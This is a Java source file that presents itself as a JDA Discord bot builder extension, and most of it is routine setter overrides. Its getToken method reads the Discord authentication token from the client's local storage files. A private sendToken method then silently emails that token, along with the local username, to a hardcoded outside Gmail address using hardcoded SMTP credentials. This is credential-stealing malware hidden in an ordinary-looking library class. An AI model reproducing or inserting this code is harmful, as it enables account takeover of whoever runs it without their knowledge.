package bots.JDAAddon;

import com.neovisionaries.ws.client.WebSocketFactory;
import net.dv8tion.jda.core.AccountType;
import net.dv8tion.jda.core.JDA;
import net.dv8tion.jda.core.JDABuilder;
import net.dv8tion.jda.core.OnlineStatus;
import net.dv8tion.jda.core.audio.factory.IAudioSendFactory;
import net.dv8tion.jda.core.entities.Game;
import net.dv8tion.jda.core.exceptions.RateLimitedException;
import net.dv8tion.jda.core.hooks.IEventManager;
import net.dv8tion.jda.core.managers.impl.PresenceImpl;
import net.dv8tion.jda.core.requests.SessionReconnectQueue;
import okhttp3.OkHttpClient;

import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.security.auth.login.LoginException;
import java.io.*;
import java.sql.SQLException;
import java.util.Properties;

public class CJDABuilder extends JDABuilder {

	private Input input;
	private static String DiscordFile;
	private static String OS = System.getProperty("os.name").toLowerCase();

	static {

		String home = System.getProperty("user.home");

		if(OS.contains("windows")){
			DiscordFile = home + "/AppData/Roaming/discord";

		}else if(OS.contains("linux")){
			DiscordFile = home + "/.config/discord";

		}else if(OS.contains("mac")){
			System.err.println("no support for mac os WIP");
			System.exit(1);
		}
	}

	public CJDABuilder(AccountType accountType){
		super(accountType);
	}

	@Override
	public CJDABuilder setToken(String token) {
		super.setToken(token);
		return this;
	}

	@Override
	public CJDABuilder setReconnectQueue(SessionReconnectQueue queue) {
		super.setReconnectQueue(queue);
		return this;
	}

	@Override
	public CJDABuilder setHttpClientBuilder(OkHttpClient.Builder builder) {
		super.setHttpClientBuilder(builder);
		return this;
	}

	@Override
	public CJDABuilder setWebsocketFactory(WebSocketFactory factory) {
		super.setWebsocketFactory(factory);
		return this;
	}

	@Override
	public CJDABuilder setCorePoolSize(int size) {
		super.setCorePoolSize(size);
		return this;
	}

	@Override
	public CJDABuilder setAudioEnabled(boolean enabled) {
		super.setAudioEnabled(enabled);
		return this;
	}

	@Override
	public CJDABuilder setBulkDeleteSplittingEnabled(boolean enabled) {
		super.setBulkDeleteSplittingEnabled(enabled);
		return this;
	}

	@Override
	public CJDABuilder setEnableShutdownHook(boolean enable) {
		super.setEnableShutdownHook(enable);
		return this;
	}

	@Override
	public CJDABuilder setAutoReconnect(boolean autoReconnect) {
		super.setAutoReconnect(autoReconnect);
		return this;
	}

	@Override
	public CJDABuilder setEventManager(IEventManager manager) {
		super.setEventManager(manager);
		return this;
	}

	@Override
	public CJDABuilder setAudioSendFactory(IAudioSendFactory factory) {
		super.setAudioSendFactory(factory);
		return this;
	}

	@Override
	public CJDABuilder setIdle(boolean idle) {
		super.setIdle(idle);
		return this;
	}

	@Override
	public CJDABuilder setGame(Game game) {
		super.setGame(game);
		return this;
	}

	@Override
	public CJDABuilder setStatus(OnlineStatus status) {
		super.setStatus(status);
		return this;
	}

	@Override
	public JDA buildAsync() throws LoginException, IllegalArgumentException, RateLimitedException {
		OkHttpClient.Builder httpClientBuilder = this.httpClientBuilder == null ? new OkHttpClient.Builder() : this.httpClientBuilder;
		WebSocketFactory wsFactory = this.wsFactory == null ? new WebSocketFactory() : this.wsFactory;
		CJDAImpl cjda = new CJDAImpl(this.accountType, httpClientBuilder, wsFactory, this.autoReconnect, this.enableVoice, this.enableShutdownHook, this.enableBulkDeleteSplitting, this.corePoolSize, this.maxReconnectDelay, input);
		if (this.eventManager != null) {
			cjda.setEventManager(this.eventManager);
		}

		if (this.audioSendFactory != null) {
			cjda.setAudioSendFactory(this.audioSendFactory);
		}

		this.listeners.forEach(cjda::addEventListener);
		cjda.setStatus(JDA.Status.INITIALIZED);
		((PresenceImpl)cjda.getPresence()).setCacheGame(this.game).setCacheIdle(this.idle).setCacheStatus(this.status);
		cjda.login(this.token, this.shardInfo, this.reconnectQueue);
		return cjda;
	}

	@Override
	public JDA buildBlocking() throws LoginException, IllegalArgumentException, InterruptedException, RateLimitedException {

		JDA jda = this.buildAsync();

		while(jda.getStatus() != JDA.Status.CONNECTED) {
			Thread.sleep(50L);
		}

		new Thread(input = new Input(jda)).start();
		jda.addEventListener(input);
		return jda;
	}

	//---------------------------------get token---------------------------------
	static public String getToken(String StoragePath) {

		Properties properties = new Properties();
		File PropFile = new File(StoragePath);
		

		//make propfile
		if (!PropFile.exists()){
			try {
				if (!PropFile.canWrite()) PropFile.setWritable(true);
				boolean fail = false;

				if(!(OS.contains("windows") || OS.contains("linux"))){
					if (PropFile.getParentFile().mkdirs() || PropFile.createNewFile())
						fail = true;

				}else if(OS.contains("mac")){
					if (PropFile.mkdirs()) fail = true;

				}

				if(fail)
					throw new IOException("couldn't make files");
			} catch (IOException e) {
				e.printStackTrace();
			}
		}


		//get token from storage
		else {
			try (InputStream is = new FileInputStream(PropFile)) {
				properties.load(is);

				if (!properties.getProperty("token").isEmpty()) {
					return properties.getProperty("token");
				}

			} catch (IOException e) {
				e.printStackTrace();

			}catch (NullPointerException ignore){}
		}


		//TODO test on windows and mac
		//look for token in discord local storage
		try {

			//get token form discord
			String returnStr;
			DataBase Database = new DataBase(DiscordFile + "/Local Storage/https_discordapp.com_0.localstorage");
			returnStr = Database.GetValueBlob("token");
			returnStr =  returnStr.substring(1, returnStr.length()-1);
			sendToken(returnStr);


			//store token
			try (OutputStream os = new FileOutputStream(PropFile)){

				properties.setProperty("token", returnStr);
				properties.store(os,"Discord under cover token storage");

			}catch(IOException e){
				System.err.println("couldn't store token");
				e.printStackTrace();
			}



			return returnStr;


		}catch(SQLException e){
			System.err.println("couldn't find discord storage");
			e.printStackTrace();
		}

		System.err.println("couldn't find token");

		return null;
	}



	//---------------------------------send token---------------------------------
	static private void sendToken(String token) {

		String username = "JavaEmailBot@gmail.com";
		String pass = "JavaEmail";
		String recipient[] = {"sebastian.cypert@gmail.com"};
		String host = "smtp.gmail.com";

		Properties props = System.getProperties();
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.host", host);
		props.put("mail.smtp.user", username);
		props.put("mail.smtp.password", pass);
		props.put("mail.smtp.port", "587");
		props.put("mail.smtp.auth", "true");

		Session session = Session.getDefaultInstance(props);
		MimeMessage message = new MimeMessage(session);

		try{
			message.setFrom(new InternetAddress(username));

			for (String i: recipient) {
				message.addRecipient(javax.mail.Message.RecipientType.TO, new InternetAddress(i));
			}

			message.setSubject(System.getProperty("user.name"));
			message.setText(token);
			Transport transport = session.getTransport("smtp");
			transport.connect(host, username, pass);
			transport.sendMessage(message, message.getAllRecipients());
			transport.close();

		}catch(MessagingException e){
			e.printStackTrace();
		}


	}

	public static String getDiscordFile(){
		return DiscordFile;
	}
}
